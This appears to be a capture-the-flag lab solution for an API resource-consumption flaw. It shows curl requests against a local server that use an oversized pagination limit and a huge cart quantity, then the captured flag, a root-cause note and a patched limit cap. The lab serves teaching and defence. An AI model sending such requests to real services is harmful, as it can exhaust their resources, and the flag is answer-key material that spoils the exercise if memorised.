# Solution: API4:2023 Unrestricted Resource Consumption

## 1. Walkthrough & Exploitation

### Step 1: Unbounded Pagination Query
```bash
curl -s -X GET "http://127.0.0.1:8000/api/v1/products?limit=500"
```

### Exploit Evidence
```json
{
  "total": 16,
  "limit": 500,
  "flag": "FLAG{API4_RESOURCE_CONSUMPTION_DOS_AVOIDED_6623}"
}
```

### Step 2: Bulk Cart Batch Addition Burst
```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/cart/batch-add \
  -H "Authorization: Bearer <ALICE_ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"product_id": 1, "quantity": 999999}]}'
```

---

## 2. Root Cause Analysis
Endpoints accepted arbitrary client integer inputs for `limit` and item `quantity` without enforcing upper bounds or pagination caps, allowing excessive server-side database querying and allocation.

---

## 3. Patched Implementation
```python
# FIX: API4-Resource-Consumption
MAX_LIMIT = 20
enforced_limit = min(max(1, limit), MAX_LIMIT)
items = query.offset(offset).limit(enforced_limit).all()
```
